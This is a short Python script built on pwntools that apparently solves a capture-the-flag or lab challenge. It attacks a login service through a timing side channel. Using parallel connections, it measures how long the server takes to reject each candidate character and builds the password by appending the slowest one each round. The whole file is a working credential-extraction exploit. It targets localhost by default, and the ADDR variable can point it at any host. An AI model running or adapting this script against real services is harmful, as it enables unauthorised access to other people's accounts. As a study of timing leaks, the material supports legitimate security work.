from pwn import *
import time
import multiprocessing

context.log_level = "WARN"

DEFAULT_ADDR = "localhost:3006"
HOST, PORT = (os.getenv("ADDR") or DEFAULT_ADDR).split(":")

password = ""


def attempt(s: int):
    # Add tiny offsets in requests so they don't all run at once
    time.sleep(random.random() * 0.1)
    global password

    s = chr(s)
    c = connect(HOST, PORT)
    c.recvuntil(b"login:")

    guess = password.encode() + s.encode()
    start = time.time_ns()
    c.sendline(guess)
    line = c.recvline()
    end = time.time_ns()
    print(".", end="", flush=True)

    if line.decode().strip() != "Login failed":
        raise Exception(line.decode().strip())

    c.close()
    return end - start, s


# this depends on your network connection, tweak as needed
POOL_SIZE = 20

try:
    while True:
        candidates = []
        with multiprocessing.Pool(POOL_SIZE) as p:
            candidates = p.map(attempt, range(33, 126))
            candidates.sort()
            password += candidates[-1][1]
            print(password)
except Exception as e:
    print(e)
